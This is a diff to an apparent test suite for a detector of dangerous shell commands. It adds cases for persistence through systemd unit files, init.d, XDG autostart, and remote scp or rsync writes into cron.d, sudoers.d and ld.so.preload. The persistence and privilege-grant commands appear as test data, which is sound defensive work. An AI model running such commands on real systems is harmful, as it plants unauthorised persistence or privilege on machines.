@@ -3276,7 +3276,7 @@ describe("POSIX: the same byte reaches the same file four other ways", () => {
 		["wget -O /tmp/data.csv https://example.com/d.csv", "downloading to a file"],
 		["wget -o /tmp/wget.log https://example.com/d.csv", "wget's lowercase -o is a log file, not the download"],
 		["wget https://example.com/d.csv", "a fetch with no output flag"],
-		["rsync -a src/ dist/", "a different copy program entirely"],
+		["rsync -a src/ dist/", "a copy program whose destination is not a startup path"],
 		["mv a b", "a rename, which is not a write to a startup file"],
 		["tar -xzf archive.tar.gz -C dist", "an archive extraction"],
 	])("%s is not dangerous — %s", (command) => {
@@ -3289,6 +3289,132 @@ describe("POSIX: the same byte reaches the same file four other ways", () => {
 		expect(posix("cp /tmp/x /etc/sudoers.d/pwn")?.rule).toContain("grants privilege");
 		expect(posix("install -m 644 /tmp/x /etc/ld.so.preload")?.rule).toContain("dynamic linker");
 		expect(posix("curl -o /etc/cron.d/b http://x/c")?.rule).toContain("scheduler runs on its own");
+	});
+});
+
+describe("POSIX: the init system's own unit files", () => {
+	/**
+	 * The persistence door this file covered in most places and missed in the one
+	 * that matters most on a modern Linux box. Every row here measured `null`, while
+	 * every neighbour in the same function — cron, rc.local, profile.d, ssh keys,
+	 * ld.so.preload, sudoers.d, autostart — already matched. `SERVICE_INSTALL_VERBS`
+	 * covers `systemctl enable`; this is the file that has to be on disk for that
+	 * command to mean anything, and it is reached without `systemctl` at all.
+	 */
+	test.each([
+		["echo x >> /etc/systemd/system/x.service", "the systemd tree, by redirect"],
+		["cat > /etc/systemd/system/x.service", "a truncating redirect"],
+		["echo x > /lib/systemd/system/x.service", "the Debian /lib spelling"],
+		["echo x > /usr/lib/systemd/system/x.service", "the /usr/lib spelling"],
+		["echo x > /usr/local/lib/systemd/system/x.service", "a locally built unit"],
+		["echo x >> /home/bob/.config/systemd/user/x.service", "a per-user unit, reached through ~"],
+		["curl -o /etc/systemd/system/x.service http://x", "a download into the unit tree"],
+		["wget -O /etc/systemd/system/x.service http://x", "wget's spelling of the same"],
+		["cp /tmp/x.service /etc/systemd/system/", "a copy naming the directory, not a file"],
+		["cp /tmp/x.service /etc/systemd/system", "the same, spelled without its trailing slash"],
+		["tee /etc/systemd/system", "tee, naming the bare directory"],
+		["echo x > /etc/xdg/autostart", "the autostart directory itself"],
+		["cp /tmp/evil.desktop ~/.config/autostart", "the per-user directory, no trailing slash"],
+		["cp /tmp/evil.desktop /home/bob/.config/autostart/", "the per-user directory, spelled out"],
+		["cp /tmp/x.service /etc/systemd/system/evil.service", "a copy naming a file"],
+		["install -m 644 /tmp/x.service /etc/systemd/system/x.service", "install"],
+		["mv /tmp/x.service /etc/systemd/system/x.service", "a move"],
+		["ln -sf /tmp/x.service /etc/systemd/system/x.service", "a symlink into the tree"],
+		["tee /etc/systemd/system/x.service", "tee"],
+		["echo x > /etc/init.d/evil", "the SysV spelling"],
+		["echo x >> /etc/rc.d/evil", "the rc.d spelling"],
+		["echo x >> /etc/xdg/autostart/evil.desktop", "the XDG autostart for every user"],
+	])("%s is dangerous", (command) => {
+		expect(posix(command)).not.toBeNull();
+	});
+
+	/**
+	 * A unit file is installed by packages, so these are the commands most likely to
+	 * be met while doing ordinary work. `ls` of the unit tree is what an admin does
+	 * first; `systemctl status` is what they do second.
+	 */
+	test.each([
+		["ls -la /etc/systemd/system/", "listing the tree"],
+		["ls /lib/systemd/system/nginx.service", "reading one unit"],
+		["systemctl status nginx", "asking about a service"],
+		["systemctl daemon-reload", "telling the init system to reread"],
+		["systemctl cat nginx", "printing a unit file"],
+		["mkdir -p /etc/systemd/system/mine.service", "a directory that happens to sit there"],
+		["grep -r ExecStart /etc/systemd/system/", "searching the tree"],
+		["systemctl restart nginx", "restarting, which is not installing"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(posix(command)).toBeNull();
+	});
+
+	/**
+	 * The message has to distinguish a unit from a shell startup file: a unit needs
+	 * no login and no shell, so reusing the login wording here would be the same
+	 * overclaim the sudoers row avoids in the other direction. The xdg row is the
+	 * control *within* this block — it really is a login-time file, so it must keep
+	 * the login sentence and must NOT pick up the init wording.
+	 */
+	test("each unit path names the claim it actually earns", () => {
+		expect(posix("echo x >> /etc/systemd/system/x.service")?.rule).toContain("init system starts");
+		expect(posix("echo x > /etc/init.d/evil")?.rule).toContain("init system starts");
+		expect(posix("dd if=/tmp/p of=/etc/systemd/system/x.service")?.rule).toContain("init system starts");
+		expect(posix("echo x >> /etc/xdg/autostart/evil.desktop")?.rule).toContain("runs on every future login");
+		expect(posix("echo x >> /etc/xdg/autostart/evil.desktop")?.rule).not.toContain("init system");
+	});
+
+	/**
+	 * The `.service` extension is not what makes it a unit, so a unit with no
+	 * extension at all has to be caught too — `/etc/systemd/system/mine.service.d`
+	 * is a drop-in directory and `/etc/systemd/system/enabled` is not a unit file at
+	 * all. The predicate is on the directory, and this pins that the directory alone
+	 * is enough rather than the directory *plus* a known suffix.
+	 */
+	test("the directory is what matches, not the file extension in it", () => {
+		expect(posix("echo x > /etc/systemd/system/plain")).not.toBeNull();
+		expect(posix("echo x > /etc/systemd/system/nginx.service.d/override.conf")).not.toBeNull();
+		expect(posix("echo x > /etc/systemd/other/x.service")).toBeNull();
+		expect(posix("echo x > /srv/systemd/system/x.service")).toBeNull();
+	});
+});
+
+describe("POSIX: a destination on another machine is still a destination", () => {
+	/**
+	 * `scp /tmp/p root@host:/etc/cron.d/job` installs the same persistence as the
+	 * local spelling, on a machine the user is not looking at.
+	 *
+	 * These measured `null` even after the sinks were added, and the reason is worth
+	 * stating because it was not obvious: every startup predicate is anchored on the
+	 * leading `/`, so a target beginning `root@host:` never reaches the directory at
+	 * all. A comment in the source had claimed the opposite — that an unanchored
+	 * `(^|/)` was letting the remote form through — and the measurement is what
+	 * showed the comment to be wrong.
+	 */
+	test.each([
+		["scp /tmp/p root@host:/etc/cron.d/job", "scp, a cron entry"],
+		["rsync /tmp/p root@host:/etc/cron.d/job", "rsync, a cron entry"],
+		["mv /tmp/p root@host:/etc/profile.d/evil.sh", "a move onto another host"],
+		["scp /tmp/p deploy@prod:/etc/ld.so.preload", "the loader, on another host"],
+		["rsync -a /tmp/p root@host:/var/spool/cron/crontabs/root", "the spool spelling"],
+		["scp /tmp/p host:/etc/sudoers.d/pwn", "a user without the usual name"],
+		["scp /tmp/p root@host:/usr/lib/systemd/system/x.service", "a unit on another host"],
+	])("%s is dangerous — %s", (command) => {
+		expect(posix(command)).not.toBeNull();
+	});
+
+	/**
+	 * The other direction, and the reason the strip is narrow: an ordinary push must
+	 * not be rewritten into something that matches. A destination with no path after
+	 * the colon names a directory on the far side, not a startup file.
+	 */
+	test.each([
+		["rsync -a ./dist/ deploy@prod:/var/www/html/", "a deploy to a web root"],
+		["scp build/a.exe user@host:/home/user/", "a file to a home directory"],
+		["scp -r src/ user@host:/opt/app/", "a recursive upload"],
+		["rsync -avz --exclude node_modules ./ dist/", "a local mirror"],
+		["scp file.txt host:", "a destination with no path after the colon"],
+		["rsync -a user@host:/srv/x ./x", "a pull, where the source is the remote half"],
+		["curl -o out.zip http://example.com/z", "a URL, whose colon is followed by //"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(posix(command)).toBeNull();
 	});
 });
 
